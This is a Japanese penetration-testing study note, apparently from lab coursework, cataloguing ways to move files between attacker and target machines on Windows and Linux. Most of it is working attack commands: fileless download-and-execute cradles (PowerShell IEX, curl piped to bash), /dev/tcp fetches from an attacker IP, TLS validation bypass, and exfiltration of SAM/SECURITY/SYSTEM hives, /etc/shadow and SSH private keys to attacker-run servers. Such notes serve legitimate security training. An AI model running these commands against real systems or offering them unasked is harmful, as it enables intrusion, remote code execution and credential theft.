---
{"dg-publish":true,"permalink":"/pentest-technique/file-transfer/"}
---

## 攻撃者側のファイルをターゲットに転送する
### Windows
- **Harmj0y** が **PowerShellダウンロードクレードル** の広範なリストを公開
- **リストはこちら** → [Harmj0y's PowerShell Download Cradle List](https://github.com/HarmJ0y/PowerShellCradle)

以下は、その中から抜粋

#### Base64エンコード&デコード
- マシンによっては、ファイルをダウンロードするときにファイアーウォールがあって、正常にダウンロードできない時もある
ファイルを`base64`形式にエンコードし、`base64`文字列をリモートサーバーに貼り付けてデコードすることでファイルの受け渡しができる

##### 攻撃者側
- ↓攻撃者端末でshellというファイルをエンコード
```shell-session
base64 <FILENAME> -w 0
```

- 正しく転送できたか、md5ハッシュを計算しておく
```shell-session
md5sum <FILENAME>
```

##### ターゲット側
- コピーしてWindows PowerShellターミナルに貼り付け、いくつかのPowerShell関数を使用してデコードする
```powershell
[IO.File]::WriteAllBytes("<出力先のパス>", [Convert]::FromBase64String("<Base64エンコードされたデータ>"))
```
MD5をチェックして、正しく転送できてるか判断する
```powershell
Get-FileHash C:\Users\Public\<FILENAME> -Algorithm md5
```

#### PowerShell Web ダウンロード  / Fileless攻撃
- `fileless` : いくつかのオペレーティングシステム機能を使用してペイロードをダウンロードし、直接実行する
	- スクリプトを直接ダウンロードして、そのままBashで実行する
	- ローカルのファイルシステムに保存されない！！！！
- リソースからデータをダウンロードするためのWebClientの表

| メソッド                                                                                                             | 説明                                                  |
| ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| **[OpenRead](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openread)**                       | リソースからデータを取得し、ストリームとして返す。                           |
| **[OpenReadAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync)**             | 呼び出し元のスレッドをブロックせずに、リソースからデータを取得する。                  |
| **[DownloadData](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata)**               | リソースからデータをダウンロードし、バイト配列として返す。                       |
| **[DownloadDataAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync)**     | 呼び出し元のスレッドをブロックせずに、リソースからデータをダウンロードし、バイト配列として返す。    |
| **[DownloadFile](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile)**               | リソースからデータをダウンロードし、ローカルファイルに保存する。                    |
| **[DownloadFileAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync)**     | 呼び出し元のスレッドをブロックせずに、リソースからデータをダウンロードし、ローカルファイルに保存する。 |
| **[DownloadString](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring)**           | リソースから文字列をダウンロードし、文字列として返す。                         |
| **[DownloadStringAsync](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync)** | 呼び出し元のスレッドをブロックせずに、リソースから文字列をダウンロードし、文字列として返す。      |

- PowerShellを使用してファイルをダウンロードする方法の例
##### 攻撃者側
pythonでHTTPサーバーとかを立ち上げて、アクセスさせる
 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする

##### ターゲット側
- クラス名`Net.WebClient`とメソッド`DownloadFile`を、ダウンロードするターゲットファイルのURLに対応するパラメータと出力ファイル名で指定する
- 
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

ファイルレスメソッド
- `fileless` : いくつかのオペレーティングシステム機能を使用してペイロードをダウンロードし、直接実行する
```powershell
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>.ps1')
```

`IEX`パイプライン入力も受け付ける
```powershell
(New-Object Net.WebClient).DownloadString('<Target File URL>.ps1') | IEX
```

#### WebRequest
##### ターゲット側

- PowerShell 3.0以降、[Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)コマンドレットも使用できますが、ファイルのダウンロードが著しく遅くなります。`Invoke-WebRequest`のフルネームの代わりに、別名`iwr`、`curl`、`wget`を使用できる
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### PowerShellのよくあるエラー
- Internet Explorer の初回起動設定が完了していないため、ダウンロードが妨げられる場合がある
	- パラメータ`-UseBasicParsing`を使用してバイパスできる
例
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

- PowerShell ダウンロードの別のエラーは、証明書が信頼されない場合、SSL/TLS セキュア チャネルに関連しています。次のコマンドでそのエラーをバイパスできる
```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```


#### SMB

- SMBサーバーから現在の作業ディレクトリにファイルをダウンロード
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- 新しいバージョンの Windows は、次のコマンドで確認できるように、認証されていないゲストのアクセスをブロックする
- Impacket SMBサーバーを使用してユーザー名とパスワードを設定し、SMBサーバーをWindowsターゲットマシンにマウントできる
```cmd
copy \\192.168.220.133\share\nc.exe
```

- SMBで新しいユーザーを作る
```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

- SMBのマウント、ユーザー名・パスワード
```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

#### FTPダウンロード
- ファイルを転送する別の方法は、ポートTCP/21とTCP/20を使用するFTP（ファイル転送プロトコル）を使用すること
- FTP クライアントまたは PowerShell Net.WebClient を使用して、FTP サーバーからファイルをダウンロードできる
- Python3 pyftpdlibモジュールを使用して、攻撃ホストにFTPサーバーを構成できます。
- 次のコマンドでインストールできる
```shell
sudo pip3 install pyftpdlib
```

- デフォルトでは、pyftpdlibはポート2121を使用するため、ポート番号21
- ユーザーとパスワードを設定しない場合、匿名認証はデフォルトで有効になる
```shell-session
sudo python3 -m pyftpdlib --port 21
```

- PowerShellを使用してFTPサーバーからファイルを転送する
```powershell-session
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- リモートマシンでシェルを取得すると、インタラクティブシェルがない可能性がある
- その場合は、FTPコマンドファイルを作成してファイルをダウンロードすることができる
- まず、実行したいコマンドを含むファイルを作成し、FTPクライアントを使用してそのファイルを使用してそのファイルをダウンロードする必要がある
```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Linux
#### Base64エンコーディング/デコード
md5ハッシュを確認する

##### 攻撃者側
```shell-session
md5sum <File>
```

Base64でエンコードする
```shell-session
cat id_rsa |base64 -w 0;echo
```
##### ターゲット側
```shell-session
echo -n 'Base64でエンコードした値' | base64 -d > id_rsa
```

md5ハッシュが一致しているかを確認する
```shell-session
md5sum id_rsa
```

#### WgetとcURLによるWebダウンロード

##### ターゲット側
wgetでのダウンロード
```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
cURLでのダウンロード
```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### ファイルレス攻撃 / Fileless攻撃
- `fileless` : いくつかのオペレーティングシステム機能を使用してペイロードをダウンロードし、直接実行する
	- スクリプトを直接ダウンロードして、そのままBashで実行する
	- ローカルのファイルシステムに保存されない！！！！
##### 攻撃者側
pythonでHTTPサーバーとかを立ち上げて、アクセスさせる
 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする

##### ターゲット側
curlによるファイルレスダウンロード
```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

wgetによるファイルレスダウンロード
```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Bashでのダウンロード(/dev/tcp)
- 一般的なファイル転送ツールが利用できない状況もある
- Bash バージョン 2.04 以降がインストールされている限り (--enable-net-redirections でコンパイル)、組み込みの /dev/TCP デバイスファイルは簡単なファイルダウンロードに使える

##### 攻撃者側
wgetとcURLの攻撃者側と同じ
```sh
python3 -m http.server 8080
```
##### ターゲット側
- ターゲットWebサーバーに接続する
```shell-session
exec 3<>/dev/tcp/<攻撃者のIP>/8080
```

- HTTP GETリクエスト
```shell-session
echo -e "GET /<ファイル名> HTTP/1.1\r\nHost: <攻撃者のIP>\r\nConnection: close\r\n\r\n" >&3
```

-  ファイルデータをファイルに書き起こす
```sh
cat <&3 > <ファイル名>
```
- 補足 : ファイルの中身をただターミナルに標準出力するだけ
```shell-session
cat <&3
```

#### SSHダウンロード
- SSHにはデフォルトでSCPがついてるから、SCPを使うこともできる
- `SCP`（セキュアコピー）は、2つのホスト間でファイルとディレクトリを安全にコピーできるコマンド
- ローカルサーバーからリモートサーバーに、リモートサーバーからローカルマシンにファイルをコピーできる
##### 攻撃者側
ターゲット側でsshを立ち上げてから、scpでファイルダウンロード
```sh
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

| 部分                         | 説明                                                     |
| -------------------------- | ------------------------------------------------------ |
| `scp`                      | Secure Copy Protocol（SSHを利用した安全なファイル転送）                |
| `plaintext@192.168.49.128` | リモートサーバーのユーザー名 `plaintext` と IP アドレス `192.168.49.128`  |
| `/root/myroot.txt`         | リモートサーバー上のファイルのパス（この場合 `/root/` ディレクトリ内の `myroot.txt`） |
| `.`                        | ローカルのカレントディレクトリ（`.` = 現在の作業ディレクトリ）にファイルをダウンロード         |

##### ターゲット側
SSH サーバーの有効化
```shell-session
sudo systemctl enable ssh
```

SSHサーバーの起動
```shell-session
sudo systemctl start ssh
```

SSH リスニングポートのチェック
- sudoが必要かも？？
```shell-session
netstat -lnpt
```


## ターゲット側のファイルを攻撃者の端末にアップロード
- パスワードの解読、分析、流出などの状況もあり、ターゲットマシンから攻撃ホストにファイルをアップロードする必要がある
- ダウンロード操作に使用したのと同じ方法を使用できますが、アップロードに使用できる
- さまざまな方法でファイルのアップロードをどのように達成できるかを見てみる

### Windows
#### PowerShell Base64エンコード&デコード
##### ターゲット側
Base64エンコード
```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
MD5ハッシュの計算
```powershell-session
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```
##### 攻撃者側
```shell-session
echo <Base64エンコードした値> | base64 -d > hosts
```
MD5ハッシュの計算と確認
```shell-session
 md5sum hosts 
```

#### PowerShell Web アップロード
##### ターゲット側
`Invoke-RestMethod`を使用してアップロード操作を実行するPowerShellスクリプト[PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)を使用できる
- スクリプトは、ファイルパスを指定するために使用する2つのパラメーター`-File`
- ファイルをアップロードするサーバーURLである`-Uri`を受け入れる
##### 攻撃者側
攻撃者側も受け取るサーバーが必要
```shell-session
pip3 install uploadserver
```
サーバーの起動
```shell-session
python3 -m uploadserver
```
##### ターゲット側
- Python アップロード サーバーにファイルをアップロードするための PowerShell スクリプト
```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```
アップロード
```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

#### PowerShell Base64 Web アップロード
- `Invoke-WebRequest` や `Invoke-RestMethod` を使い、PowerShell でデータを送信
- `Netcat` を使い、指定したポートでリスニング
- `POST` リクエストとしてファイルを送信
- 出力をコピーして、base64 デコード関数でファイルに変換
##### 攻撃者側
base64エンコードした値を受け取る
```shell-session
nc -lvnp 8000
```
base64エンコードをファイルに戻す
```shell-session
 echo <base64> | base64 -d -w 0 > hosts
```

##### ターゲット側
```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

```powershell-session
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

#### SMBアップロード
- 以前、企業は通常、`HTTP`（TCP/80）および`HTTPS`（TCP/443）プロトコルを使用してアウトバウンドトラフィックを許可することについて議論した。
	- 一般的に、企業はSMBプロトコル（TCP/445）を内部ネットワークから外すことを許可しない
		- なぜなら、これは潜在的な攻撃に開放される可能性があるから
	- 代替
		- `WebDav`でHTTP上でSMBを実行すること
			- `WebDAV`[（RFC 4918）](https://datatracker.ietf.org/doc/html/rfc4918)は、WebブラウザとWebサーバーが相互に通信するために使用するインターネットプロトコルであるHTTPの拡張
		- `WebDAV`はHTTPSも使用できる
##### 攻撃者側
wsgidavとcherootの2つをインストールする必要ある
```shell-session
sudo pip3 install wsgidav cheroot
```

```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
##### ターゲット側
Webdav シェアへの接続
```cmd-session
dir \\192.168.49.128\DavWWWRoot
```
- `DavWWWRoot`は、Windows Shellによって認識される特別なキーワード
- WebDAVサーバーにはそのようなフォルダは存在しない
- DavWWWRoot キーワードは、WebDAV サーバーのルートに接続している WebDAV 要求を処理する Mini-Redirector ドライバーに伝えます。
- サーバーに接続するときにサーバーに存在するフォルダを指定すると、このキーワードの使用を避けることができる

#### LinuxでSMBサーバーを建てる
##### ターゲット側
攻撃者がsmbを立てて、ターゲットのWindowsは、攻撃者に送る
```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
##### 攻撃者側
```sh
pwd
```

```sh
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData <pwdの結果>
```


#### FTPアップロード
##### 攻撃者側
- FTPを使用してファイルをアップロードすることは、ファイルのダウンロードと非常によく似ている
- PowerShell または FTP クライアントを使用して操作を完了できる
- Python モジュール pyftpdlib を使用して FTP サーバーを開始する前に、クライアントが攻撃ホストにファイルをアップロードできるようにするオプション --write を指定する必要がある
```shell
sudo python3 -m pyftpdlib --port 21 --write
```
##### ターゲット側
それでは、PowerShellのアップロード機能を使用して、FTPサーバーにファイルをアップロードする
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### FTPクライアントがファイルをアップロードするためのコマンドファイルを作成
```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

### Linux

#### webアップロード(HTTPS)
##### ターゲット側
httpsサーバーをターゲット側で立てるってことだね
webサーバーの開始
```shell-session
sudo python3 -m pip install --user uploadserver
```

自己署名証明書の作成
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

ウェブサーバーは証明書をホストすべきではありません。ウェブサーバーのファイルをホストするために、新しいディレクトリを作成した方がいい
```shell-session
mkdir https && cd https
```
##### 攻撃者側
複数のファイルを取得する
- 自己署名証明書を受け入れるように、`--insecure`を追加する
```shell-session
 curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```


### 簡単なhttpのwebサーバーを立てる方法(HTTP)
##### ターゲット側

- `python3 -m http.server 8080`
- `python3 -m uploadserver`
- `python2.7 -m SimpleHTTPServer`
- `php -S 0.0.0.0:8000`
- `ruby -run -ehttpd . -p8000`
##### 攻撃者側
```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```

## コードを使ったファイルダウンロード
- ターゲット側でコードを使って、ファイルをダウンロードする
- Linux では **Python、PHP、Perl、Ruby,JavaScript** などの言語が一般的に利用できる
- Windows にもインストールすることは可能(一般的ではないけど)
	- Windows では **`cscript` や `mshta`** などのデフォルトアプリケーションを使って **JavaScript や VBScript** を実行することができる
### 攻撃者側
pythonでHTTPサーバーとかを立ち上げて、アクセスさせる
 ```bash
python3 -m http.server 8080
 ```

  攻撃者サーバーを一時的にwebサーバーとする
### ターゲット側
#### Python2
```shell-session
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### Python3
```shell-session
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#### PHP
##### File_get_contents()でPHPをダウンロード
```shell-session
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
##### Fopen()でPHPダウンロード
```shell-session
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
##### PHPでファイルをダウンロードし、それをBashにパイプする
```shell-session
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
##### Ruby
```shell-session
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```
##### Perl
```shell-session
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
#### Windows専用
##### JavaScript
- Windows コマンド プロンプトまたは PowerShell ターミナルから次のコマンドを使用して、JavaScript コードを実行し、ファイルをダウンロードできる
- 以下を`wget.js`で保存する
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
###### JavaScriptとcscript.exeを使用してファイルをダウンロードする
- 上の`wget.js`を保存する
```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
##### VBスクリプト
- Windows コマンド プロンプトまたは PowerShell ターミナルから次のコマンドを使用して、VB Scriptを実行し、ファイルをダウンロードできる
- `wget.vbs`というファイルを作成し、次のコンテンツを保存する
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
###### VBScriptとcscript.exeを使用してファイルをダウンロードする
```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## SCPを使う
リモートホストでsshユーザー資格情報を取得した場合、`scp`を使用することでファイルのやり取りできる
SSHのサービスが動いてるなら、SCPも使える
```shell-session
scp linenum.sh user@remotehost:/tmp/linenum.sh
```


## そのほかのファイル転送方法
- netcat
- nc
### WinRMでのファイル転送
```powershell-session
 Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

```powershell-session
$Session = New-PSSession -ComputerName DATABASE01
```

```powershell-session
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

```powershell-session
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```
#### rdesktopを使用したLinuxフォルダのマウント

```shell-session
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
#### xfreerdpを使用したLinuxフォルダのマウント
```shell-session
xfreerdp /v:<IP> /d:<ユーザー名> /u:<ログインするユーザー名> /p:'<パスワード>' /drive:<共有名(なんでもおけ)>,<ローカルディレクトリのパス>
```